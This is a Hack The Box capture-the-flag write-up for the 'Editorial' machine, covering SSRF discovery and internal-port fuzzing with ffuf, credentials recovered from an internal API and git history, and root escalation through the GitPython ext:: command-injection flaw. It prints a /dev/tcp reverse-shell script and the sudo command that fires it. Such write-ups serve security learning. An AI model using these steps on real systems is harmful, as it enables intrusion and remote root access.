---
date: 2024-10-16T21:00:55-05:00
# description: ""
image: "/images/HTB-Editorial/Editorial.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Editorial"
type: "post"
---

* Platform: Hack The Box
* Link: [Editorial](https://app.hackthebox.com/machines/Editorial)
* Level: Easy
* OS: Linux
---

Editorial is an easy Linux machine with a few interesting challenges. The web application is vulnerable to Server-Side Request Forgery (SSRF), but it requires fuzzing internal ports to uncover sensitive data. By exploiting an API endpoint, we retrieve credentials that grant initial access to the system. During further enumeration, we discover a series of Git commits, one of which exposes credentials for another user, enabling lateral movement. Privilege escalation is achieved by exploiting CVE-2022-24439 in combination with a root-executable script, leading to root access.

Target IP Address - `10.10.11.20`

## Scanning

```
./nmap_scan.sh 10.10.11.20 Editorial
```

**Results**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 21:07 CDT
Nmap scan report for 10.10.11.20
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds
```

Two open ports are found 22 (SSH) and 80 (HTTP), additionally there is a redirection to `editorial.htb`.

```
sudo echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts
```

## Enumeration

On `http://editorial.htb` we find a website for a publishing company.

![Editorial website](/images/HTB-Editorial/Editorial_website.png)

We get to `http://editorial.htb/upload` after clicking `Publish with Us`. We can either send a link or upload a file.

![Editorial Publish with Us page](/images/HTB-Editorial/editorial_upload_feature.png)

Since the application accepts a user provided url let's test for SSRF. After filling the form we capture the request from clicking on the `Preview` button.

![Editorial upload-cover request](/images/HTB-Editorial/Upload_Cover_Req.png)

We send the request and get a valid response (**Status Code 200OK**), the server header (**nginx/1.18.0 (Ubuntu)**), and some content at `/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg` most likely from some internal application. This means that the SSRF is working, as the application is fetching and returning content from the internal service at `127.0.0.1:80`.

![Editorial upload-cover request response](/images/HTB-Editorial/Upload_Cover_response.png)

Another test would be to use our own IP address with a port number of our choosing with a listener set up on that same port.

![SSRF test on local Kali](/images/HTB-Editorial/SSRF_test.png)

On the listener we get a response, also confirming the SSRF presence.

![SSRF local test nc response](/images/HTB-Editorial/SSRF_nc_connection.png)

Checking the content of the response with `http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg`, we see a banal picture.

![Editorial SSRF response content](/images/HTB-Editorial/response_content.png)

We are on the right track but we are missing something. Most of the time internal applications run on a different port that is not exposed to the public. In order to find the correct one we will do some fuzzing.

I use the request from Burp, format it as much as I can and remove the redundant headers.

By using it with ffuf we find the port `5000`.

> You could do it with Burp, but keep in mind that the free version rate limit the Intruder feature, so fuzzing all the ports would take you a long time! Ffuf does it in less than 4 minutes which is better in my opinion.

```
ffuf -u 'http://editorial.htb/upload-cover' \
-d $'-----------------------------29074654981783001802154691355\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\nhttp://127.0.0.1:FUZZ/\r\n-----------------------------29074654981783001802154691355\r\nContent-Disposition: form-data; name="bookfile"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------29074654981783001802154691355--' \
-w <(seq 1 65535) \
-H 'Content-Type: multipart/form-data; boundary=---------------------------29074654981783001802154691355' \
-H 'Host: editorial.htb' \
-t 100 \
-mc all \
-fs 61
```

![SSRF ffuf internal port fuzzing](/images/HTB-Editorial/SSRF_ffuf_Fuzzing.png)


| Option | Description                                                                                 |
| ------ | ------------------------------------------------------------------------------------------- |
| -u     | Specifies the target URL                                                                    |
| -d $   | Specifies the HTTP request body                                                             |
| -w     | Wordlist (we are using a dynamically generated list for all the port numbers)               |
| FUZZ   | This string will be replaced with each number during the fuzzing process                    |
| -H     | Specifies the HTTP header                                                                   |
| -t 100 | Sets the number of concurrent threads                                                       |
| -mc    | Specifies which HTTP response status code to filter                                         |
| all    | When used, ffuf will not filter responses based on status codes and will show all responses |
| -fs 61 | Filters by response size. Here, responses with a body size of 61 bytes will be filtered out |

![SSRF Internal port 5000 found](/images/HTB-Editorial/internal_port_5000_found.png)

## Initial Foothold

Now we re-send the request with `http://127.0.0.1:5000` and get a different directory (`uploads`).

![SSRF Internal port number request](/images/HTB-Editorial/SSRF_internal_port_number.png)

When we go to `http://editorial.htb/static/uploads/e9ed8f81-925d-40e0-945e-7fcb30899573` a file gets automatically downloaded on our machine.

![SSRF File Downloaded](/images/HTB-Editorial/File_Downloaded.png)

It contains some JSON data.

![JSON Data ugly](/images/HTB-Editorial/JSON_data_ugly.png)

With `jq` we can make it easier to read.

```
cat e9ed8f81-925d-40e0-945e-7fcb30899573 | jq
```

![JSON Data pretty](/images/HTB-Editorial/JSON_data_pretty.png)

This is a list of api endpoints.

```JSON
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

After testing them, the response we get from `http://127.0.0.1:5000/api/latest/metadata/messages/authors` triggers another file download at `http://editorial.htb/static/uploads/c1c51caa-8a20-4f95-aca1-3a55e0a0fb69`.

> Those numbers are dynamically generated so yours will be different.

![message authors api endpoint](/images/HTB-Editorial/message_authors_api_endpoint.png)

![message authors api endpoint file downloaded](/images/HTB-Editorial/message_authors_file.png)

It is a welcome message for an author with their credentials, `dev:dev080217_devAPI!@`.

![dev credentials](/images/HTB-Editorial/dev_credentials.png)

Using those credentials we login via SSH, and recover the user flag.

![dev shell and user flag](/images/HTB-Editorial/user_flag_editorial.png)

### Lateral Movement (Shell as prod)

In `/home/dev/apps` we find a `.git` directory.

![.git file](/images/HTB-Editorial/git-file.png)

Running `git log` inside it brings a list of commits.

![git log command](/images/HTB-Editorial/git_log.png)

After using `git show` on the third commit from the top we find another set of credentials, `prod:080217_Producti0n_2023!@`.

```
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

![prod user credentials](/images/HTB-Editorial/prod_creds.png)

With them we get another SSH shell as `prod`, this user home directory does not hold anything special. 

However he is allowed to run the command `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py` with any arguments (`*`) as the root user. The `*` is a wildcard that allows any arguments to be passed to the script.

![sudo -l command](/images/HTB-Editorial/sudo-l_cmd.png)

Let's check the content of `/opt/internal_apps/clone_changes/clone_prod_change.py`

![clone_prod_change python script](/images/HTB-Editorial/clone_prod_change_script.png)

This script clones a Git repository into a specific directory (`/opt/internal_apps/clone_changes`). The option `multi_options=["-c protocol.ext.allow=always"]` allows the `ext::` protocol to be used for cloning.

## Privilege Escalation

Using `pip3 list` we find the list of all Python packages installed on the system. `GitPython` immidiately stands out, it is running version `3.1.29`.

![installed python packages list](/images/HTB-Editorial/python_pkg_list.png)

Researching about vulnerabilities for this version we find [CVE-2022-24439](https://github.com/PyCQA/bandit/issues/971) with a PoC [here](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).

The exploit leverages the `ext::` protocol in Git which allows users to use external commands instead of standard protocol such as `https` and `ssh`, with this we can achieve a command injection.

Let's use a bash script in order to get a reverse shell as `root`.

We create `revshell.sh` and make it executable with `chmod +x revshell.sh`.

```bash
#!/bin/bash

IP="YOUR_IP"  
PORT="PORT_NUMBER"

/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1
```

Then we run the command below to get a root shell on our listener enabling us to read the root flag in `/root`.

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::/tmp/revshell.sh'
```

![Reverse shell trigger](/images/HTB-Editorial/git_script_ext.png)

![Editorial root flag](/images/HTB-Editorial/root_flag_editorial.png)

I appreciate you taking the time to read this write up, keep learning!
